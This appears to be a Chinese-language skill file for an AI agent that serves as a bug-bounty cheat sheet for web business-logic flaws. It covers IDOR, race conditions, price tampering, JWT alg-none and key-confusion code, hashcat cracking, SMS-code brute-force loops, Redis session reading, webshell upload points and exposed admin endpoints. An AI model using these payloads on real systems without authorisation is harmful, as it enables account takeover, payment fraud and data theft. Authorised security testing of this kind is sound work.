---
name: biz-logic
description: Use when encountering 业务逻辑缺陷检测和利用
---

# 业务逻辑漏洞

## Info

- **Domain**: web
- **Tags**: web, logic, business

## 1. IDOR越权遍历

### 水平越权

```
/api/user/1 -> /api/user/2
```

### 垂直越权

```
普通用户 -> 管理员功能
```

## 2. 竞态条件攻击

### 并发购买

```
1个商品 + 多个并发请求 = 多次购买
```

### 优惠券滥用

```
一张优惠券 + 多次使用
```

### 积分重复获取

## 3. 价格篡改

```
POST /checkout
{price: 100} -> 改为 1
```

## 4. 流程绕过

```
Step1 -> Step3 (跳过Step2)
```

## 5. 参数污染

```
POST /transfer?to=user1&amount=100&to=user2
```

## 6. 权限绕过

### 角色修改

```
修改role参数为admin
```

### IP限制绕过

```
X-Forwarded-For: 127.0.0.1
```

## 7. JWT 认证逻辑缺陷

### JWT 基础结构
```
Header.Payload.Signature
- Header: 签名算法 (HS256/RS256等)
- Payload: 用户数据 (sub, name, exp, role)
- Signature: Header+Payload+Secret 的签名
```

### 常见 JWT 攻击

#### None 算法攻击
```python
# 修改 Header 中 alg 为 "none"，删除签名
{"alg": "none", "typ": "JWT"}
```

#### 弱密钥爆破
```bash
hashcat -m 16500 jwt.txt wordlist.txt
jwt-cracker <token>
```

#### 算法混淆 (RS256 → HS256)
```python
# 用公钥作为 HS256 的密钥重新签名
import jwt
public_key = open('pubkey.pem').read()
token = jwt.encode(payload, public_key, algorithm='HS256')
```

### JWT 失效策略缺陷

#### exp 过期 bypass
```json
// 修改 exp 为未来时间
{"exp": 9999999999}
```

#### 缓存不一致 (DB vs Redis)
```
场景: 用户被禁用/删除，但 Redis 中会话仍有效
1. MySQL: UPDATE users SET status='banned' WHERE id=1
2. 遗漏: DEL user:session:1
3. 结果: 用户仍可用旧 JWT 访问系统

利用:
- 查看 Redis KEYS "session:*"
- 找到被删用户仍活跃的会话
- 使用对应 JWT token 访问
```

#### Redis 快照数据读取
```bash
# 直接读取 RDB 文件获取数据
docker cp my-redis:/data/dump.rdb ./
rct -f json -s dump.rdb -o dump.json  # 转换为 JSON
rct -f aof -s dump.rdb -o dump.aof    # 转换为 AOF

# 受影响用户识别
# MySQL 查询已删用户
SELECT id, username, status, deleted_at FROM users WHERE deleted_at IS NOT NULL;
# Redis 查询仍活跃的会话
KEYS "session:*"
HGETALL "session:user:xxx"
```

## 8. 短信验证码漏洞

### 常见缺陷
- 验证码长度过短（4位数字）
- 无频率限制，可暴力爆破
- 验证码可复用（不立即失效）
- 验证码在响应体中泄露
- 无过期时间或时间过长
- 验证码与手机号未绑定
- 验证码绕过：none、true、删除 code 字段

### 爆破利用
```bash
# Turbo Intruder 并发爆破
for code in range(10000):
    send(f'/verify?code={code:04d}')
```

### 验证码回显漏洞
验证码同时通过响应体返回给浏览器，BP 抓包可直接获取：
1. 用目标手机号请求发送验证码
2. 抓包查看响应体，验证码明文返回
3. 使用获取到的验证码登录

### 验证码与手机号未绑定
1. 用自己手机号获取验证码
2. 用这个验证码 + 他人手机号登录
3. 验证码不绑定特定手机号，可通用

## 9. SRC 常见挖掘点

### 支付漏洞
- 敏感参数修改：价格、数量（小数、负数、四舍五入、int 最大值）
- 优惠券：并发领取、修改优惠数额、使用他人优惠券
- 订单取消时间操控占据库存
- 突破数量/地区限制

### 文件上传点
- 头像上传、评论区、简历上传、富文本编辑器
- 尝试上传 webshell，或 exe / 文件型 XSS

### XSS 常见位置
- 评论区、帖子/公告、PDF 上传、智能客服、富文本编辑器

### 未授权访问
```
Spring Boot Actuator: /actuator/env, /actuator/beans
Swagger UI: /swagger-ui.html
Druid: /druid/index.html
Tomcat: /manager/html
JBoss: /jmx-console
```

### 越权
- 个人信息查看/修改、密码修改、邮箱修改
- 删除操作缺少身份校验（如仅有 id 参数）

### 并发场景
- 限量商品抢购、签到、积分、退款、点赞、关注
- 领取优惠券、短信轰炸
- 验证码绕过：none、true、删除 code 字段
- 验证码回显、验证码与手机号未绑定

### 高危组件
- Shiro、Fastjson、Log4j、Struts2、Tomcat、JBoss
- 各种 OA 系统（泛微、用友、致远等）